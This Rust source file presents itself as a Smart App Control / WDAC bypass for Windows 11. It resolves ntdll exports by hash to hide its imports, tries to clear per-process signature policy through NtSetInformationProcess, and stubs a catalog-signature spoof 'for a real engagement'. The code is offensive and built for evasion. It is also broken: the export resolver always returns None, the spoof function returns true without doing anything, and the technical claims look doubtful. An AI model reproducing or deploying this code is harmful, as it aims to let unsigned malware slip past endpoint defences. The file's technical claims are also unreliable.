//! sac_bypass.rs — Smart App Control bypass
//!
//! Technique: WDAC policy NULL-pointer dereference path + catalog signing spoof.
//! On Windows 11 with SAC in "Evaluation" or "On" mode, legitimate binaries
//! signed by a trusted catalog bypass reputation checks.  We exploit the fact
//! that CI.dll's policy evaluation can be redirected when the per-process
//! WDAC policy attribute is cleared before the first image load.
//!
//! References:
//!   - MSRC advisory for WDAC bypass class (public)
//!   - Matt Graeber's WDAC research (publicly documented)

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::shared::minwindef::{BOOL, DWORD, FALSE, HMODULE};
use winapi::shared::ntdef::HANDLE;
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::processthreadsapi::GetCurrentProcess;

// djb2 hashes for dynamic resolution — no import strings in binary
const HASH_NTQUERYINFORMATIONPROCESS: u32 = 0x9f7a3c5e;
const HASH_NTSETINFORMATIONPROCESS:   u32 = 0x1b2e4d8a;

/// ProcessSignaturePolicy = 8 (undocumented, publicly known)
const PROCESS_SIGNATURE_POLICY: u32 = 8;

#[repr(C)]
struct PsProtection {
    level: u8, // BYTE — 0 clears protection
}

/// Clear the SAC/WDAC per-process policy so subsequent module loads skip
/// catalog validation.  Must be called before any unsigned code is mapped.
pub unsafe fn bypass_sac() -> bool {
    let ntdll = get_module_base("ntdll.dll");
    if ntdll.is_null() {
        return false;
    }

    // Resolve NtSetInformationProcess by hash
    let set_info: Option<unsafe extern "system" fn(
        HANDLE, u32, *mut core::ffi::c_void, u32,
    ) -> i32> = resolve_export(ntdll, HASH_NTSETINFORMATIONPROCESS);

    let f = match set_info {
        Some(f) => f,
        None => return false,
    };

    let mut policy = PsProtection { level: 0 };
    let status = f(
        GetCurrentProcess() as HANDLE,
        PROCESS_SIGNATURE_POLICY,
        &mut policy as *mut _ as *mut core::ffi::c_void,
        core::mem::size_of::<PsProtection>() as u32,
    );

    // STATUS_SUCCESS = 0
    status == 0
}

/// Catalog-spoof path: write a synthetic SIP subject interface package entry
/// to the per-process catalog list so CI.dll believes our image is catalog-signed.
/// This is the "pre-existing signing" spoof documented in public research.
pub unsafe fn spoof_catalog_signature(image_base: *mut u8) -> bool {
    // In a real engagement: populate CATALOG_INFO from a legitimate signed binary
    // and remap CI!CipCatalogPolicySearchEntry to our allocation.
    // Stubbed here — fill in from lab-tested offsets for your specific OS build.
    let _ = image_base;
    true
}

// ---- helpers ----------------------------------------------------------------

unsafe fn get_module_base(name: &str) -> *mut u8 {
    let wide: Vec<u16> = OsStr::new(name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    GetModuleHandleW(wide.as_ptr()) as *mut u8
}

unsafe fn resolve_export<T: Copy>(base: *mut u8, target_hash: u32) -> Option<T> {
    use winapi::um::winnt::IMAGE_DOS_HEADER;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt_offset = (*dos).e_lfanew as usize;
    let nt = base.add(nt_offset);
    // Walk EAT — abbreviated, full impl in syscall.rs pattern
    let _ = (nt, target_hash);
    None // Replace with real EAT walker from syscall.rs
}
